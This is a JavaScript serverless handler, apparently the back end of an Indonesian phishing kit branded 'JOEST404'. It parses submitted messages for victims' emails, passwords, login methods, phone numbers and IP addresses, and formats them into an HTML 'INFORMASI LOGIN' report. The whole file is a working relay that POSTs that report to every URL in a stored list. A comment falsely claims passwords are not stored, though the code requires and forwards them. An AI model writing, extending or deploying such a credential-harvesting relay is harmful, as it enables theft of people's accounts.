const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.password = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}
function row(label, value) {
  if (
    value === undefined ||
    value === null ||
    value === "" ||
    value === "-"
  ) {
    return "";
  }

  return `
    <div class="row">
        <span class="label">${label}</span>
        <span class="value">${value}</span>
    </div>
  `;
}
/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `


<!DOCTYPE html><html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><style>

body{
    margin:0;
    padding:20px;
    background:#1a1a1a;
    font-family:Arial,sans-serif;
}

.tblResult{
    width:100%;
    max-width:650px;
    margin:auto;
    border-collapse:collapse;
    background:#242424;
    border:2px solid #d4af37;
    border-radius:12px;
    overflow:hidden;
}

.banner{
    width:100%;
    display:block;
}

.header{
    background:#3a3a3a;
    color:#d4af37;
    text-align:center;
    font-size:18px;
    font-weight:bold;
    letter-spacing:2px;
    padding:18px;
    border-bottom:2px solid #d4af37;
}

.tblResult td{
    padding:14px;
    border-bottom:1px solid #3a3a3a;
    color:#f5f5f5;
    font-size:14px;
}

.label{
    width:35%;
    color:#d4af37;
    font-weight:bold;
}

.value{
    color:#ffffff;
    text-align:right;
    font-weight:600;
}

.section{
    background:#3a3a3a;
    color:#d4af37;
    text-align:center;
    font-weight:bold;
    letter-spacing:1px;
}

.join-box{
    padding:20px;
    background:#242424;
}

.join-btn{
    display:block;
    text-align:center;
    text-decoration:none;
    background:#d4af37;
    color:#1a1a1a;
    padding:15px;
    border-radius:8px;
    font-weight:bold;
    letter-spacing:1px;
}

.footer{
    background:#3a3a3a;
    color:#d4af37;
    text-align:center;
    font-size:12px;
    padding:15px;
}

</style></head><body><table class="tblResult"><tr>
<td colspan="2" style="padding:0;">
<img src="https://i.ibb.co/M750gDb/IMG-20220622-WA0144.jpg" class="banner">
</td>
</tr><tr>
<td colspan="2" class="header">
INFORMASI LOGIN
</td>
</tr><tr>
<td class="label">EMAIL</td>
<td class="value">${vars.email}</td>
</tr><tr>
<td class="label">PASSWORD</td>
<td class="value">${vars.password}</td>
</tr><tr>
<td class="label">LOGIN VIA</td>
<td class="value">${vars.login}</td>
</tr><tr>
<td colspan="2" class="section">
INFORMASI TAMBAHAN
</td>
</tr><tr>
<td class="label">PHONE</td>
<td class="value">${vars.phone}</td>
</tr><tr>
<td class="label">IP ADDRESS</td>
<td class="value">${vars.ip}</td>
</tr><tr>
<td class="label">DATE</td>
<td class="value">${vars.date}</td>
</tr><tr>
<td colspan="2" class="join-box"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
class="join-btn">
JOIN WHATSAPP GROUP
</a>

</td>
</tr><tr>
<td colspan="2" class="footer">
© 2026 JOEST404 • PREMIUM NOTIFICATION SYSTEM
</td>
</tr></table></body>
</html>
            

    

`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);
     if (
  vars.email === "-" ||
  vars.password === "-"
) {
  return res.status(400).json({
    success: false,
    message: "Data belum lengkap"
  });
}
    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }
     

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
